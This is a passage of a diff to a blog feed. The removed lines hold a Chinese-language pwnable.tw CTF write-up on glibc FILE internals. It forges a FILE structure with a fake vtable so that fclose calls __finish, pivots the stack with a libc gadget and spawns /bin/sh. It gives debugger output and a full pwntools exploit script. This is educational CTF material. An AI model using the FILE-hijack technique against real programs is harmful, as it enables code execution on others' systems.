-  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
-
-  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
-
-  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
-
-  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
-<span class="c">#if 0
-  int _blksize;
-#else</span>
-  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
-<span class="cp">#endif
-</span>  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>
-
-<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp">
-</span>  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
-  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
-  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-
-  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>
-
-  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
-<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
-</span><span class="p">};</span>
-</code></pre></div></div>
-
-<p>不过完整的FILE结构还多一个word，用来存放一个函数指针表vtable，这是为了与C++的streambuf兼容，在 <code class="language-plaintext highlighter-rouge">libio/libioP.h</code> 中可以找到其定义：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* We always allocate an extra word following an _IO_FILE.
-   This contains a pointer to the function jump table used.
-   This is for compatibility with C++ streambuf; the word can
-   be used to smash to a pointer to a virtual function table. */</span>
-
-<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
-<span class="p">{</span>
-  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
-  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
-<span class="p">};</span>
-</code></pre></div></div>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
-<span class="p">{</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
-    <span class="cm">/* showmany */</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
-    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
-<span class="c">#if 0
-    get_column;
-    set_column;
-#endif
-</span><span class="p">};</span>
-</code></pre></div></div>
-
-<h2 id="fclose-分析">fclose 分析</h2>
-
-<p>声明在 <code class="language-plaintext highlighter-rouge">include/stdio.h</code> 中：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="kt">int</span> <span class="nf">_IO_new_fclose</span> <span class="p">(</span><span class="n">_IO_FILE</span><span class="o">*</span><span class="p">);</span>
-<span class="cp">#   define fclose(fp) _IO_new_fclose (fp)
-</span></code></pre></div></div>
-
-<p>定义在 <code class="language-plaintext highlighter-rouge">libio/iofclose.c</code> 中，比较重要的是下面几行：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* First unlink the stream.  */</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
-    <span class="n">_IO_un_link</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
-
-  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
-    <span class="n">status</span> <span class="o">=</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-  <span class="k">else</span>
-    <span class="n">status</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-  <span class="n">_IO_FINISH</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-</code></pre></div></div>
-
-<p>与lock相关的代码实在是太复杂了，现在的我还没有宏孩儿的功力，因此只能暂且作罢。事实证明这题里面不用管它。</p>
-
-<p>那么有两种攻击方法：一种是通过_IO_file_close_it调用vtable中的 <code class="language-plaintext highlighter-rouge">__close</code>；一种是通过_IO_FINISH（定义见下）调用vtable中的 <code class="language-plaintext highlighter-rouge">__finish</code>。</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
-</span></code></pre></div></div>
-
-<p>我使用的是后者，因为比较简单，但第一个方法看上去也是非常可行的。
-具体来说，只要把 <code class="language-plaintext highlighter-rouge">_IO_IS_FILEBUF</code> flag置零，就可以跳过unlink和close_it，调用到finish。</p>
-
-<h2 id="漏洞利用">漏洞利用</h2>
-
-<p>既然栈上可以随便溢出，那我就寻思着想办法来个ROP！
-我们可以使用上述方法劫持程序控制流来执行一次给定地址的代码，因此我的思路就是找一个长得像这样的gadget，直接将栈“迁移”到我可以控制的位置：<code class="language-plaintext highlighter-rouge">add esp, xxx; ret</code></p>
-
-<p>在本地调试时，在调用 <code class="language-plaintext highlighter-rouge">__finish</code> 后的第一条指令处停下，然后查看此时栈的情况：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; stack 30
-00:0000│ esp 0xffffcafc —▸ 0xf7e79fa8 (fclose+232) ◂— mov edx, dword ptr [esi + 0x68]
-01:0004│     0xffffcb00 —▸ 0x804c410 ◂— 0xfbad240c
-02:0008│     0xffffcb04 ◂— 0x0
-03:000c│     0xffffcb08 —▸ 0xf7e5ebcb (vfprintf+11) ◂— add ebx, 0x16e435
-04:0010│     0xffffcb0c ◂— 0x0
-05:0014│     0xffffcb10 —▸ 0xf7fe76eb (_dl_fixup+11) ◂— add esi, 0x15915
-06:0018│     0xffffcb14 ◂— 0x0
-07:001c│     0xffffcb18 —▸ 0xf7fcd000 ◂— 0x1afdb0
-08:0020│     0xffffcb1c —▸ 0xf7fcd000 ◂— 0x1afdb0
-09:0024│     0xffffcb20 —▸ 0xffffcb88 ◂— 0x0
-0a:0028│     0xffffcb24 —▸ 0xf7fedf10 (_dl_runtime_resolve+16) ◂— pop edx
-0b:002c│     0xffffcb28 —▸ 0xf7e79ecb (fclose+11) ◂— add ebx, 0x153135
-0c:0030│     0xffffcb2c ◂— 0x0
-0d:0034│     0xffffcb30 —▸ 0xf7fcd000 ◂— 0x1afdb0
-0e:0038│     0xffffcb34 —▸ 0xf7fcd000 ◂— 0x1afdb0
-0f:003c│ ebp 0xffffcb38 —▸ 0xffffcb88 ◂— 0x0
-10:0040│     0xffffcb3c —▸ 0x8048b14 (main+221) ◂— add esp, 0x10
-11:0044│     0xffffcb40 —▸ 0x804c410 ◂— 0xfbad240c
-12:0048│     0xffffcb44 —▸ 0x804b260 (name) ◂— '114514'
-13:004c│     0xffffcb48 —▸ 0xffffcb88 ◂— 0x0
-14:0050│     0xffffcb4c —▸ 0x8048a62 (main+43) ◂— sub esp, 8
-15:0054│     0xffffcb50 ◂— 0x1
-16:0058│     0xffffcb54 ◂— 0x8000
-17:005c│     0xffffcb58 ◂— 0x5
-18:0060│     0xffffcb5c ◂— '5aaaaaaabbbbbbbbccccccccdddddddd'
-</code></pre></div></div>
-
-<p>可以发现，此时esp和可控的位置之间相差了 0x60 个字节。于是我在libc中找到了这个gadget：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
-</code></pre></div></div>
-
-<p>有了这个gadget，我们就可以愉快地ROP了！直接 system(“/bin/sh”) 就行。</p>
-
-<h3 id="结构体伪造">结构体伪造</h3>
-
-<p>首先要伪造的是FILE结构体，其中我们需要关注的是flags字段和vtable字段。使用pwntools的API可以超级方便地完成这一步：</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># fake file
-</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
-    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
-</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>   <span class="c1"># name
-</span></code></pre></div></div>
-
-<p>根据vtable的定义，<code class="language-plaintext highlighter-rouge">__finish</code> 位于第三个指针处，在32位下就是0x8偏移处，因此我把它就直接放在name的地方。</p>
-
-<p>最终伪造目标是这样（Fake Vtable除了__finish以外的值都不需要关心，因此我随意地在这里放了一个/bin/sh字符串）：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name ─────►┌─────────────────┐ ─┬─
-     Fake  │/bin/sh\0        │  │
-     Vtable├────────┬────────┤  │
-           │__finish│        │  │
-           ├────────┴────────┤  │ 0x20
-           │                 │  │
-           │                 │  │
-           │                 │  │
-  fp ─────►├────────┬────────┤ ─┴─
-           │fp+0x10 │        │
-           ├────────┘        │
-           │                 │
-     ─────►├─────────────────┤
-     Fake  │ Flag            │
-     FILE
-
-           ├─────────────────┤
-           │(vtable)&amp;name    │
-           └─────────────────┘
-</code></pre></div></div>
-
-<h3 id="exp脚本">EXP脚本</h3>
-
-<p>细节：泄露libc时，由于buffer长度问题，libc基址不会在第一次就读取出来。但是我发现这一地址就是libc基址减去0x1000的偏移，因此我在这里加上0x1000就可以完成泄露。（一开始没发现这个，一位这个地址就是libc基址，因此卡了好久好久……）</p>
-
-<p>最后输入选项的时候，payload以5开头，后面是ROP gadget。这样 <code class="language-plaintext highlighter-rouge">atoi(payload)</code> 的结果就是5，也就是选择exit功能。</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
-</span>
-<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-
-    <span class="c1"># leak libc_addr
-</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"see"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/proc/self/maps"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"[heap]</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000</span>
-    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base -&gt; "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-    <span class="c1"># libc_base = int(input("addr:"), 16)
-</span>
-    <span class="c1"># create rop chain
-</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"5"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xb</span>
-    <span class="c1"># payload += pack(elf.symbols["puts"]) + pack(0) + pack(0x08048C90) # test
-</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B260</span><span class="p">)</span>
-
-    <span class="c1"># fake file
-</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
-    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
-</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>
-
-    <span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0005ae90</span><span class="p">)</span>  <span class="c1"># fake vtable
-</span>    <span class="n">name</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x14</span>
-    <span class="n">name</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B280</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xc</span>  <span class="c1"># fake FILE pointer
-</span>    <span class="n">name</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fileStr</span><span class="p">)</span>
-    
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>后记：后来发现其实根本不用ROP，由于调用vtable中的函数时，参数就是自己的file pointer，所以只要在flag字段后面加上”;/bin/sh;”，然后把 <code class="language-plaintext highlighter-rouge">__finish</code> 设置成system地址，就可以直接get shell。见<a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/#seethefile">R4bb1t师傅的博客</a></p>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。]]></summary></entry></feed>
+<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[本题 neta 了星界边境，实现了一个简单的二维探索游戏。]]></summary></entry></feed>
